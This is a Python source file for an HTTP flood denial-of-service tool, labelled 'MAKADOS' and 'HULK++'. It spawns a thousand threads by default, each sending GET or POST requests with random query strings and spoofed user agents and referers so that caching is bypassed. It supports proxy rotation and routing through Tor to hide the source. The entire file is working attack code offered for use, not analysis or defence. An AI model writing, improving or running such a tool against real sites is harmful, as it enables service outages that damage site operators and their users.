
# Features: GET/POST flood, proxy rotation, Tor support, multithreaded, logging
# MAKADOS: Advanced HTTPS DoS Tool
# Author: Makadeshwar
# Copyright (c) 2025 Makadeshwar
# Licensed under the MIT License. See LICENSE file for details.

import urllib.request
import urllib.parse
import random
import threading
import string
import sys
import time
import argparse
import os

# Global Counters
request_count = 0
error_count = 0

def random_str(length=8):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def build_get_url(base):
    return f"{base}?{random_str(5)}={random_str(10)}"

def build_post_data():
    return urllib.parse.urlencode({random_str(5): random_str(10) for _ in range(5)}).encode()

def load_proxies(proxy_file):
    with open(proxy_file, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def build_request(target_url, post_mode):
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Referer": random.choice(REFERERS) + random_str(5),
        "Cache-Control": "no-cache",
        "Connection": "close"
    }

    if post_mode:
        data = build_post_data()
        req = urllib.request.Request(target_url, data=data)
    else:
        target_url = build_get_url(target_url)
        req = urllib.request.Request(target_url)

    for k, v in headers.items():
        req.add_header(k, v)

    return req

def attack(target, use_post=False, proxy=None, use_tor=False, silent=False, log_file=None):
    global request_count, error_count

    while True:
        try:
            req = build_request(target, use_post)
            if proxy:
                proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
                opener = urllib.request.build_opener(proxy_handler)
                urllib.request.install_opener(opener)

            if use_tor:
                os.system(f"torsocks curl -s -o /dev/null {req.full_url} &")
                request_count += 1
                continue

            urllib.request.urlopen(req, timeout=4)
            request_count += 1
            if not silent:
                print(f"[+] Sent: {req.full_url}")

            if log_file:
                with open(log_file, 'a') as f:
                    f.write(f"{time.ctime()} - HIT: {req.full_url}\n")

        except Exception as e:
            error_count += 1
            if not silent:
                print(f"[!] Error: {str(e)}")

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
]

REFERERS = [
    "http://www.google.com/?q=",
    "http://www.bing.com/search?q=",
    "http://search.yahoo.com/search?p=",
    "http://duckduckgo.com/?q=",
]

def main():
    parser = argparse.ArgumentParser(description="HULK++: Advanced HTTP DoS Tool")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("--post", action="store_true", help="Use POST method")
    parser.add_argument("--threads", type=int, default=1000, help="Number of threads (default=1000)")
    parser.add_argument("--proxies", help="Path to proxy list file")
    parser.add_argument("--tor", action="store_true", help="Route traffic through Tor")
    parser.add_argument("--log", help="Log output to file")
    parser.add_argument("--silent", action="store_true", help="Suppress terminal output")
    args = parser.parse_args()

    proxies = load_proxies(args.proxies) if args.proxies else [None]
    threads = []

    for i in range(args.threads):
        proxy = random.choice(proxies) if proxies else None
        t = threading.Thread(target=attack, args=(args.target, args.post, proxy, args.tor, args.silent, args.log))
        t.daemon = True
        t.start()
        threads.append(t)

    while True:
        time.sleep(5)
        if not args.silent:
            print(f"\n[+] Total Requests: {request_count} | Errors: {error_count}\n")

if __name__ == '__main__':
    main()
